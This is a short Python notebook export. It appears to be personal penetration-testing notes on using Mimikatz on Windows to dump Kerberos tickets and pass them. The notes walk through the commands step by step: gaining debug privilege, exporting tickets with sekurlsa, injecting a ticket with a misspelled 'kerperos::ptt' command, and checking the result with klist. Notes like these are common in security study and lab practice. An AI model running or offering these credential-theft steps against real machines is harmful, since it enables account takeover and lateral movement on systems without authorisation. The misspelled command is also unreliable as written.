#!/usr/bin/env python
# coding: utf-8

# # MimiKatz
# 
# Mimikatz is a post-exploit tool used for dumping user credentials once you already have access to a Windows machine. It can use these tickets.
# 
# ## Install
# Good question.... Looks to be an EXE you can copy....
# 
# ## Running
# From Windows CMD, just run the EXE. This will update your terminal to "mimikat #" and the below commands must be run inside this environment.
# <hr>

# ## Pass The Ticket
# 
# 
# ### Check Privilege
# First you need make sure you're running cmd as an admin (local is sufficient).
# 
# > privilege::debug
# 
# This should return "Privilege '20' OK"<br>
# 
# ### Dump
# Next, dump the tickets to the pwd
# 
# > sekurlsa::tickets /export
# 
# This will dump the current tickets. You can also use one that has already been dumped, such as by Rubeus.<br>
# 
# ### Pass The Ticket
# You can now pass the file as a ticket. The names can be quite detailed but everything needs to be included, that includes the square brackets and special characters.
# 
# > kerperos::ptt [file.ext]
# 
# ### Verify
# You can verify your are using the ticket with
# 
# > klist
# 
# <hr>
